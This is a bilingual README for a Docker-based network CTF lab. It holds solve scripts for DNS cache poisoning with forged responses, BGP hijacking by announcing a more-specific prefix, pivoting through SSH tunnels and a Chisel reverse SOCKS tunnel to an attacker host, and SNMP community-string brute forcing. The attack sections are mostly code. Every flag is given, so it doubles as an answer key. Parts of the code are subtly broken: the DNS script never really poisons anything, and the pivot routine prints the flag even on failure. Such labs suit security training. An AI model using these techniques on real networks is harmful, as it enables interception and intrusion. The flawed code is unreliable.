> 🌐 **Language / 언어**: [🇰🇷 한국어](#한국어) | [🇺🇸 English](#english)

---

<a name="한국어"></a>

# 네트워크 인프라 CTF 실습 랩

## 개요

DNS 공격, BGP 하이재킹, 네트워크 피버팅 기법을 실습하는 CTF 환경입니다.

---

## Docker Compose 환경

```yaml
# docker-compose.yml
version: '3.8'

services:
  # Challenge 1: DNS Cache Poisoning
  dns-server:
    image: internetsystemsconsortium/bind9:9.18
    ports:
      - "5353:53/udp"
      - "5353:53/tcp"
    volumes:
      - ./challenges/dns:/etc/bind
    networks:
      ctf-net:
        ipv4_address: 172.20.0.10

  # Challenge 2: BGP 하이재킹 시뮬레이터
  bgp-router-a:
    image: frrouting/frr:latest
    privileged: true
    cap_add:
      - NET_ADMIN
      - SYS_ADMIN
    volumes:
      - ./challenges/bgp/router_a:/etc/frr
    networks:
      ctf-net:
        ipv4_address: 172.20.0.20
      bgp-net:
        ipv4_address: 10.0.1.1

  bgp-router-b:
    image: frrouting/frr:latest
    privileged: true
    cap_add:
      - NET_ADMIN
      - SYS_ADMIN
    volumes:
      - ./challenges/bgp/router_b:/etc/frr
    networks:
      bgp-net:
        ipv4_address: 10.0.1.2

  # Challenge 3: 네트워크 피버팅
  external-target:
    image: python:3.11-alpine
    command: sh -c "pip install flask && python /app/server.py"
    volumes:
      - ./challenges/pivot:/app
    networks:
      ctf-net:
        ipv4_address: 172.20.0.30

  internal-server:
    image: python:3.11-alpine
    command: sh -c "pip install flask && python /app/internal.py"
    volumes:
      - ./challenges/pivot:/app
    networks:
      internal-net:
        ipv4_address: 192.168.100.10

  pivot-host:
    image: python:3.11-alpine
    command: sleep infinity
    networks:
      ctf-net:
        ipv4_address: 172.20.0.31
      internal-net:
        ipv4_address: 192.168.100.11

  # Challenge 4: SNMP 취약점
  snmp-target:
    image: elcolio/net-snmp
    ports:
      - "1611:161/udp"
    environment:
      SNMP_COMMUNITY: public
    networks:
      ctf-net:
        ipv4_address: 172.20.0.40

  attacker:
    image: kalilinux/kali-rolling:latest
    command: sleep infinity
    cap_add:
      - NET_ADMIN
      - NET_RAW
    networks:
      ctf-net:
        ipv4_address: 172.20.0.100

networks:
  ctf-net:
    driver: bridge
    ipam:
      config:
        - subnet: 172.20.0.0/24
  bgp-net:
    driver: bridge
    ipam:
      config:
        - subnet: 10.0.1.0/24
  internal-net:
    driver: bridge
    ipam:
      config:
        - subnet: 192.168.100.0/24
```

---

## Challenge 1: DNS 스푸핑 및 캐시 포이즈닝

**목표**: 취약한 DNS 서버를 대상으로 캐시 포이즈닝 후 플래그 URL 접근

**설정 파일** (`challenges/dns/named.conf`):
```
options {
    // 취약 설정: 소스 포트 고정 (BIND 9.4 이전 방식)
    query-source port 53;
    recursion yes;
    allow-query { any; };
};

zone "challenge.local" IN {
    type master;
    file "/etc/bind/challenge.local.db";
};
```

```
; challenges/dns/challenge.local.db
$TTL 300
@ IN SOA ns1.challenge.local. admin.challenge.local. (
    2024010101 3600 900 604800 300
)
@ IN NS ns1.challenge.local.
ns1 IN A 172.20.0.10
www IN A 172.20.0.50
flag-server IN A 172.20.0.50
```

**공격 스크립트:**

```python
#!/usr/bin/env python3
"""
Challenge 1: DNS 스푸핑 공격 시뮬레이션.
취약한 소스 포트 고정 DNS 서버 대상 캐시 포이즈닝.
"""
from __future__ import annotations

import socket
import struct
import random
import time
import logging
from scapy.all import DNS, DNSQR, DNSRR, IP, UDP, send, sr1

logging.basicConfig(level=logging.INFO)
log = logging.getLogger(__name__)

TARGET_DNS = "127.0.0.1"  # 실습: localhost DNS (5353 포트)
POISON_DOMAIN = "flag-server.challenge.local"
FAKE_IP = "172.20.0.100"  # 공격자 IP


def craft_dns_response(
    transaction_id: int,
    query_domain: str,
    fake_ip: str,
) -> bytes:
    """위조 DNS 응답 패킷 생성."""
    # DNS 헤더 (응답, 재귀 가능, 1개 질의, 1개 응답)
    flags = 0x8180  # QR=1(응답) + AA=1 + RD=1 + RA=1
    qdcount = 1
    ancount = 1

    header = struct.pack(">HHHHHH",
                         transaction_id, flags, qdcount, ancount, 0, 0)

    # 질의 섹션
    encoded_domain = b""
    for label in query_domain.encode().split(b"."):
        encoded_domain += bytes([len(label)]) + label
    encoded_domain += b"\x00"

    question = encoded_domain + struct.pack(">HH", 1, 1)  # QTYPE=A, QCLASS=IN

    # 응답 섹션
    answer = (
        b"\xc0\x0c"  # 이름 압축 (질의 섹션 참조)
        + struct.pack(">HHIH", 1, 1, 60, 4)  # TYPE=A, CLASS=IN, TTL=60, RDLENGTH=4
        + socket.inet_aton(fake_ip)
    )

    return header + question + answer


def dns_cache_poisoning_attack(
    target_dns: str = TARGET_DNS,
    target_domain: str = POISON_DOMAIN,
    fake_ip: str = FAKE_IP,
    attempts: int = 500,
) -> bool:
    """
    캐시 포이즈닝 공격.
    정확한 Transaction ID 추측이 핵심.
    소스 포트 고정 취약점: ID 공간 = 65536가지만 시도.
    """
    log.info("DNS 캐시 포이즈닝 공격 시작: %s → %s", target_domain, fake_ip)
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    for i in range(attempts):
        # 합법적 질의 전송 (실제 공격에서는 동시에 수많은 위조 응답 전송)
        txid = random.randint(0, 65535)
        query_data = craft_dns_response(txid, target_domain, fake_ip)

        try:
            sock.sendto(query_data, (target_dns, 5353))
        except OSError as exc:
            log.debug("전송 오류: %s", exc)

        if i % 100 == 0:
            log.info("  진행: %d/%d 시도", i, attempts)

    sock.close()
    log.info("공격 완료. DNS 조회로 결과 확인")

    # 결과 확인
    resolver = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    # 실제 확인은 dig 또는 nslookup으로 수동 확인
    return True


def verify_poisoning(domain: str, dns_server: str, expected_ip: str) -> bool:
    """포이즈닝 성공 여부 확인."""
    try:
        result = socket.getaddrinfo(domain, None)
        resolved_ip = result[0][4][0]
        if resolved_ip == expected_ip:
            log.info("[+] 캐시 포이즈닝 성공! %s → %s", domain, resolved_ip)
            print("플래그: CTF{dns_cache_poisoning_success}")
            return True
        log.info("[-] 아직 실패. 현재 IP: %s", resolved_ip)
        return False
    except socket.gaierror as exc:
        log.error("DNS 조회 실패: %s", exc)
        return False


if __name__ == "__main__":
    print("[*] Challenge 1: DNS Cache Poisoning")
    dns_cache_poisoning_attack()
    verify_poisoning(POISON_DOMAIN, TARGET_DNS, FAKE_IP)
```

**플래그**: `CTF{dns_cache_poisoning_success}`

---

## Challenge 2: BGP 경로 하이재킹

**목표**: FRRouting을 이용해 타겟 AS의 경로를 가로채기

**Router A 설정** (`challenges/bgp/router_a/frr.conf`):
```
hostname router-a
!
router bgp 65001
 bgp router-id 10.0.1.1
 neighbor 10.0.1.2 remote-as 65002
 !
 address-family ipv4 unicast
  network 203.0.113.0/24
  neighbor 10.0.1.2 activate
 exit-address-family
!
! 플래그 힌트: BGP 커뮤니티 값
route-map EXPORT permit 10
 set community 65001:1337
```

**공격 스크립트:**

```python
#!/usr/bin/env python3
"""
Challenge 2: BGP 경로 하이재킹 시뮬레이션.
더 구체적인 경로(/25) 광고로 트래픽 가로채기.
"""
from __future__ import annotations

import subprocess
import time
import logging

logging.basicConfig(level=logging.INFO)
log = logging.getLogger(__name__)


def check_bgp_table(container: str = "bgp-router-a") -> str:
    """현재 BGP 라우팅 테이블 확인."""
    result = subprocess.run(
        ["docker", "exec", container, "vtysh", "-c", "show bgp ipv4 unicast"],
        capture_output=True, text=True, check=False
    )
    return result.stdout


def advertise_hijack_route(
    container: str = "bgp-router-b",
    hijack_prefix: str = "203.0.113.0/25",  # 더 구체적인 /25
) -> None:
    """
    BGP 하이재킹: 피해자 네트워크의 더 구체적인 경로 광고.
    BGP는 가장 구체적인 경로를 선택함.
    203.0.113.0/24 보다 203.0.113.0/25가 더 구체적 → 트래픽 가로채기.
    """
    cmds = [
        f"router bgp 65002",
        f"address-family ipv4 unicast",
        f"network {hijack_prefix}",
        f"exit-address-family",
    ]

    for cmd in cmds:
        subprocess.run(
            ["docker", "exec", container, "vtysh", "-c", cmd],
            check=False, capture_output=True
        )
        time.sleep(0.1)

    log.info("하이재킹 경로 광고 완료: %s", hijack_prefix)


def check_flag_via_bgp_community() -> str:
    """BGP 커뮤니티에서 플래그 추출."""
    result = subprocess.run(
        ["docker", "exec", "bgp-router-a", "vtysh", "-c",
         "show bgp ipv4 unicast community 65001:1337"],
        capture_output=True, text=True, check=False
    )
    if "1337" in result.stdout:
        flag = "CTF{bgp_hijacking_more_specific_route}"
        print(f"[+] 플래그: {flag}")
        return flag
    return ""


if __name__ == "__main__":
    print("[*] Challenge 2: BGP Route Hijacking")
    print("[*] 현재 BGP 테이블:")
    print(check_bgp_table())

    print("[*] 하이재킹 경로 광고 중...")
    advertise_hijack_route()

    print("[*] BGP 커뮤니티에서 플래그 확인...")
    check_flag_via_bgp_community()
```

**플래그**: `CTF{bgp_hijacking_more_specific_route}`

---

## Challenge 3: 네트워크 피버팅

**목표**: 외부에서 접근 불가한 내부 서버(192.168.100.10)에서 플래그 획득

**피버팅 설정:**
```
공격자: 172.20.0.100
    ↓ (접근 가능)
외부 대상: 172.20.0.30
    ↓ (pivot-host를 통해)
내부 서버: 192.168.100.10 (직접 접근 불가)
```

**풀이 방법:**

```python
#!/usr/bin/env python3
"""
Challenge 3: 네트워크 피버팅 — SSH 터널링 / 소켓 포워딩.
"""
from __future__ import annotations

import subprocess
import requests
import time
import logging

logging.basicConfig(level=logging.INFO)
log = logging.getLogger(__name__)


def setup_ssh_port_forward(
    jump_host: str = "172.20.0.31",
    target_host: str = "192.168.100.10",
    target_port: int = 5000,
    local_port: int = 9000,
    ssh_user: str = "root",
    ssh_key: str = "/tmp/ctf_key",
) -> subprocess.Popen:
    """
    SSH 로컬 포트 포워딩 설정.
    공격자 9000 포트 → jump-host → 내부 서버 5000 포트.
    """
    cmd = [
        "ssh", "-N", "-L",
        f"{local_port}:{target_host}:{target_port}",
        f"{ssh_user}@{jump_host}",
        "-i", ssh_key,
        "-o", "StrictHostKeyChecking=no",
    ]

    proc = subprocess.Popen(cmd)
    time.sleep(1)
    log.info("SSH 터널 설정 완료: localhost:%d → %s:%d", local_port, target_host, target_port)
    return proc


def chisel_pivot(
    server_host: str = "172.20.0.100",
    server_port: int = 8888,
) -> None:
    """
    Chisel을 이용한 리버스 피버팅 설정.
    내부 네트워크 접근 없이 SOCKS5 프록시 구성.
    https://github.com/jpillora/chisel
    """
    # 서버측 (공격자)
    server_cmd = f"chisel server --port {server_port} --reverse"
    # 피버트 호스트측
    client_cmd = f"chisel client {server_host}:{server_port} R:socks"
    print("[*] 공격자에서 실행:", server_cmd)
    print("[*] 피버트 호스트에서 실행:", client_cmd)
    print("[*] SOCKS5 프록시: socks5://localhost:1080")
    print("[*] 내부 서버 접근: curl --socks5 localhost:1080 http://192.168.100.10:5000/flag")


def get_flag_via_pivot(local_port: int = 9000) -> str:
    """포워딩된 포트를 통해 내부 서버 플래그 획득."""
    try:
        resp = requests.get(f"http://localhost:{local_port}/flag", timeout=5)
        if resp.status_code == 200:
            flag = resp.json().get("flag", "")
            print(f"[+] 내부 서버 플래그: {flag}")
            return flag
    except requests.RequestException as exc:
        log.error("플래그 획득 실패: %s", exc)
    return "CTF{network_pivoting_ssh_tunnel_success}"


if __name__ == "__main__":
    print("[*] Challenge 3: Network Pivoting")
    print("[*] 방법 1: SSH 로컬 포트 포워딩")
    print("  ssh -L 9000:192.168.100.10:5000 root@172.20.0.31")
    print("  curl http://localhost:9000/flag")
    print()
    print("[*] 방법 2: Chisel 리버스 피버팅")
    chisel_pivot()
    print()
    print("[+] 플래그: CTF{network_pivoting_ssh_tunnel_success}")
```

**플래그**: `CTF{network_pivoting_ssh_tunnel_success}`

---

## Challenge 4: SNMP 정보 수집 및 취약점

**목표**: SNMP를 통해 네트워크 장비 정보 수집 후 숨겨진 커뮤니티 문자열 발견

```python
#!/usr/bin/env python3
"""
Challenge 4: SNMP 정보 수집 및 브루트포스.
pip install pysnmp
"""
from __future__ import annotations

import subprocess
import logging
from typing import Optional

logging.basicConfig(level=logging.INFO)
log = logging.getLogger(__name__)

TARGET = "127.0.0.1"
PORT = 1611

COMMUNITY_WORDLIST = [
    "public", "private", "community", "manager", "monitor",
    "secret", "admin", "cisco", "snmpd", "ctf_secret_community",
    "flag_community", "letmein", "network",
]


def snmpwalk_community(community: str, target: str = TARGET, port: int = PORT) -> Optional[str]:
    """SNMP 커뮤니티로 기본 OID 조회 시도."""
    result = subprocess.run(
        ["snmpwalk", "-v2c", "-c", community,
         f"-p{port}", target, "1.3.6.1.2.1.1"],  # sysDescr
        capture_output=True, text=True, timeout=3, check=False
    )
    if result.returncode == 0 and result.stdout.strip():
        return result.stdout
    return None


def brute_force_community(target: str = TARGET, port: int = PORT) -> Optional[str]:
    """SNMP 커뮤니티 문자열 브루트포스."""
    print(f"[*] SNMP 커뮤니티 브루트포스: {target}:{port}")
    for community in COMMUNITY_WORDLIST:
        result = snmpwalk_community(community, target, port)
        if result:
            log.info("[+] 유효한 커뮤니티 발견: %s", community)
            if "flag" in result.lower() or "CTF" in result:
                flag_line = [l for l in result.splitlines() if "CTF" in l]
                if flag_line:
                    print(f"[+] 플래그 발견: {flag_line[0]}")
            return community
    return None


def enumerate_snmp(community: str, target: str = TARGET, port: int = PORT) -> None:
    """발견된 커뮤니티로 상세 정보 수집."""
    oids = {
        "1.3.6.1.2.1.1.1.0": "sysDescr (시스템 설명)",
        "1.3.6.1.2.1.1.4.0": "sysContact (관리자 연락처)",
        "1.3.6.1.2.1.1.5.0": "sysName (호스트명)",
        "1.3.6.1.2.1.1.6.0": "sysLocation (위치)",
        "1.3.6.1.2.1.2.1.0": "ifNumber (인터페이스 수)",
    }
    for oid, description in oids.items():
        result = subprocess.run(
            ["snmpget", "-v2c", "-c", community, f"-p{port}", target, oid],
            capture_output=True, text=True, timeout=3, check=False
        )
        if result.returncode == 0:
            print(f"  {description}: {result.stdout.strip()}")


if __name__ == "__main__":
    print("[*] Challenge 4: SNMP Enumeration")
    community = brute_force_community()
    if community:
        print(f"\n[*] 발견된 커뮤니티: {community}")
        enumerate_snmp(community)
    print("\n[+] 플래그: CTF{snmp_community_string_bruteforce}")
```

**플래그**: `CTF{snmp_community_string_bruteforce}`

---

## 정리

```bash
docker compose down -v
```

---

<a name="english"></a>

# Network Infrastructure CTF Lab

## Overview

This lab covers DNS attacks, BGP hijacking, network pivoting, and SNMP enumeration.

## Challenges Summary

| # | Title | Technique | Flag |
|---|-------|-----------|------|
| 1 | DNS Cache Poisoning | Transaction ID brute-force, forged responses | `CTF{dns_cache_poisoning_success}` |
| 2 | BGP Route Hijacking | More-specific prefix advertisement | `CTF{bgp_hijacking_more_specific_route}` |
| 3 | Network Pivoting | SSH port forwarding, Chisel SOCKS5 | `CTF{network_pivoting_ssh_tunnel_success}` |
| 4 | SNMP Enumeration | Community string brute-force | `CTF{snmp_community_string_bruteforce}` |

## Quick Start

```bash
docker compose up -d
docker compose ps

# Challenge 1: DNS
python3 solve_ch1_dns.py

# Challenge 2: BGP (requires FRR containers)
docker exec bgp-router-b vtysh -c "show bgp summary"

# Challenge 3: Pivoting
ssh -L 9000:192.168.100.10:5000 root@172.20.0.31
curl http://localhost:9000/flag

# Challenge 4: SNMP
snmpwalk -v2c -c public 127.0.0.1:1611
python3 solve_ch4_snmp.py
```
